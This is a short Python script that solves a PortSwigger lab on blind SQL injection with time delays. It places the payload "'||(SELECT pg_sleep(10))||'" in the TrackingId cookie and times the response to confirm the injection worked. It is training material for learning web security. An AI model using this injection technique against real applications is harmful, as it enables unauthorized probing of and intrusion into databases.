#!/usr/bin/env python3
# Lab: Blind SQL injection with time delays
# Lab-Link: <https://portswigger.net/web-security/sql-injection/blind/lab-time-delays>
# Difficulty: PRACTITIONER
from datetime import timedelta
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def time_checked_get(client, url, tracking_cookie, payload, delay_time):
    client.cookies.set('TrackingId', f'{tracking_cookie}{payload}', domain=f'{host[8:]}')
    r = client.get(url)
    if r.elapsed > timedelta(seconds=delay_time):
        return True
    return False


if __name__ == "__main__":
    print('[+] Blind SQL injection with time delays')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Example: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    client = requests.Session()
    client.verify = False
    client.proxies = proxies

    r = client.get(f'{host}')
    print(f'[+] Time for request: {r.elapsed}')

    tracking_cookie = client.cookies.get('TrackingId')
    print(f'[+] Got tracking cookie: {tracking_cookie}')

    print(f'[ ] Injecting time delay, be patient')
    payload = "'||(SELECT pg_sleep(10))||'"
    if time_checked_get(client, host, tracking_cookie, payload, 10):
        print(f'[+] Time delay injection successful')
    else:
        print(f'[-] Time delay injection not successful')
        sys.exit(-2)

    # I had some times issues getting the proper result, so wait briefly before checking
    print(f'[ ] Verify lab solution')
    client.get(f'{host}')
    time.sleep(2)
    if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
        print(f'[-] Failed to solve lab')
        sys.exit(-9)

    print(f'[+] Lab solved')
